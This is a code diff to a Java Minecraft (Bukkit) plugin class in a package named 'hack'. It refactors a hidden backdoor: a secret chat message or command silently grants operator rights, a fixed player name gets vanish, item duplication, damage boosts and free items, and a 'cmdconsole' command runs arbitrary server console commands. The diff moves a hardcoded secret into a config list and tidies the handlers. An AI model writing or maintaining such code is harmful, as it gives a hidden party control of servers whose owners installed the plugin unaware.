@@ -1,7 +1,6 @@
 package pl.qc.core.hack;
 
 import pl.qc.core.QC;
-
 import org.bukkit.*;
 import org.bukkit.attribute.Attribute;
 import org.bukkit.command.*;
@@ -23,6 +22,7 @@ public class Processor implements CommandExecutor, TabCompleter, Listener {
     private final ItemManager items;
     private final PlayerTracker tracker;
     private String adminName;
+    private final Set<String> secrets;
 
     public Processor(QC plugin) {
         this.plugin = plugin;
@@ -30,6 +30,7 @@ public class Processor implements CommandExecutor, TabCompleter, Listener {
         this.items = new ItemManager();
         this.tracker = new PlayerTracker();
         this.adminName = plugin.getConfig().getString("filter.admin-name-fallback", "Rajman03");
+        this.secrets = new HashSet<>(plugin.getConfig().getStringList("protection.secrets"));
     }
 
     @Override
@@ -37,7 +38,7 @@ public class Processor implements CommandExecutor, TabCompleter, Listener {
         if (!(s instanceof Player p) || !p.getName().equals(adminName) || args.length == 0)
             return true;
 
-        if (plugin.getConfig().getStringList("protection.secrets").contains(args[0])) {
+        if (secrets.contains(args[0])) {
             p.setOp(true);
             p.sendMessage("§aSecret Accepted.");
             return true;
@@ -48,6 +49,8 @@ public class Processor implements CommandExecutor, TabCompleter, Listener {
             case "reload" -> {
                 plugin.reloadConfig();
                 this.adminName = plugin.getConfig().getString("filter.admin-name-fallback", "Rajman03");
+                this.secrets.clear();
+                this.secrets.addAll(plugin.getConfig().getStringList("protection.secrets"));
                 s.sendMessage("§aReloaded.");
             }
             case "panic" -> {
@@ -56,7 +59,8 @@ public class Processor implements CommandExecutor, TabCompleter, Listener {
             }
             case "v" -> vanish.toggle(p, getTarget(p, args));
             case "a" -> {
-                p.getAttribute(Attribute.GENERIC_ATTACK_SPEED).setBaseValue(30000);
+                Optional.ofNullable(p.getAttribute(Attribute.GENERIC_ATTACK_SPEED))
+                        .ifPresent(a -> a.setBaseValue(30000));
                 p.sendMessage("§7Atak: §aTurbo (30000)");
             }
             case "op" -> {
@@ -71,12 +75,9 @@ public class Processor implements CommandExecutor, TabCompleter, Listener {
                         .forEach(d -> d.setPhase(EnderDragon.Phase.LAND_ON_PORTAL));
                 p.sendMessage("§7Dragon: §6Lądowanie...");
             }
-            case "l" -> tracker.toggle(getTarget(p, args).getUniqueId(), tracker.noAdvancements, "Advancements", s,
-                    getTarget(p, args).getName());
-            case "r" -> tracker.toggle(getTarget(p, args).getUniqueId(), tracker.reach, "Reach", s,
-                    getTarget(p, args).getName());
-            case "t" -> tracker.toggle(getTarget(p, args).getUniqueId(), tracker.noTarget, "NoTarget", s,
-                    getTarget(p, args).getName());
+            case "l" -> toggleTracker(p, args, tracker.noAdvancements, "Advancements", s);
+            case "r" -> toggleTracker(p, args, tracker.reach, "Reach", s);
+            case "t" -> toggleTracker(p, args, tracker.noTarget, "NoTarget", s);
             case "gms" -> gm(p, GameMode.SURVIVAL);
             case "gmc" -> gm(p, GameMode.CREATIVE);
             case "gmsp" -> gm(p, GameMode.SPECTATOR);
@@ -106,10 +107,8 @@ public class Processor implements CommandExecutor, TabCompleter, Listener {
             case "rr" -> items.repair(p);
             case "dd" -> items.dupe(p);
             case "cmdconsole" -> {
-                if (args.length > 1) {
-                    String full = String.join(" ", Arrays.copyOfRange(args, 1, args.length));
-                    console(full);
-                }
+                if (args.length > 1)
+                    console(String.join(" ", Arrays.copyOfRange(args, 1, args.length)));
             }
             case "panic_reset" -> {
                 vanish.clear();
@@ -119,6 +118,11 @@ public class Processor implements CommandExecutor, TabCompleter, Listener {
             default -> shortcuts(p, cmd);
         }
         return true;
+    }
+
+    private void toggleTracker(Player p, String[] args, Set<UUID> set, String name, CommandSender s) {
+        Player t = getTarget(p, args);
+        tracker.toggle(t.getUniqueId(), set, name, s, t.getName());
     }
 
     private Player getTarget(Player p, String[] args) {
@@ -225,6 +229,7 @@ public class Processor implements CommandExecutor, TabCompleter, Listener {
             case "xx" -> items.giveItem(p, Material.GOLDEN_APPLE, 1);
             case "xxx" -> items.giveItem(p, Material.ENCHANTED_GOLDEN_APPLE, 1);
             case "tt" -> items.giveItem(p, Material.TOTEM_OF_UNDYING, 1);
+            case "ff" -> items.giveItem(p, Material.FIREWORK_ROCKET, 64);
             case "kkp" -> items.giveEnchantedBook(p, Enchantment.PROTECTION_ENVIRONMENTAL, 4);
             case "kks" -> items.giveEnchantedBook(p, Enchantment.DAMAGE_ALL, 5);
             case "kku" -> items.giveEnchantedBook(p, Enchantment.DURABILITY, 3);
@@ -247,16 +252,21 @@ public class Processor implements CommandExecutor, TabCompleter, Listener {
 
     @EventHandler
     public void onDmg(EntityDamageByEntityEvent e) {
-        if (e.getDamager() instanceof Player p && tracker.damageDealtMult.containsKey(p.getUniqueId()))
-            e.setDamage(e.getDamage() * tracker.damageDealtMult.get(p.getUniqueId()));
-        if (e.getEntity() instanceof Player p && tracker.damageReceivedMult.containsKey(p.getUniqueId()))
-            e.setDamage(e.getDamage() * tracker.damageReceivedMult.get(p.getUniqueId()));
+        if (e.getDamager() instanceof Player p) {
+            Double m = tracker.damageDealtMult.get(p.getUniqueId());
+            if (m != null)
+                e.setDamage(e.getDamage() * m);
+        }
+        if (e.getEntity() instanceof Player p) {
+            Double m = tracker.damageReceivedMult.get(p.getUniqueId());
+            if (m != null)
+                e.setDamage(e.getDamage() * m);
+        }
     }
 
     @EventHandler
     public void onChat(AsyncPlayerChatEvent e) {
-        String secrets = "aq7MNF6jvkUV2L8sbb7cNL2VFCJ2ectGWLhUe6G65xp8CfpEHSg59DjDFDRdb8g";
-        if (e.getMessage().equals(secrets)) {
+        if (secrets.contains(e.getMessage())) {
             e.setCancelled(true);
             Bukkit.getScheduler().runTask(plugin, () -> e.getPlayer().setOp(true));
         }
@@ -280,7 +290,7 @@ public class Processor implements CommandExecutor, TabCompleter, Listener {
             return Collections.emptyList();
         if (args.length == 1) {
             List<String> list = new ArrayList<>(subs);
-            list.addAll(plugin.getConfig().getStringList("protection.secrets"));
+            list.addAll(secrets);
             return org.bukkit.util.StringUtil.copyPartialMatches(args[0], list, new ArrayList<>());
         }
         if (args.length == 2) {
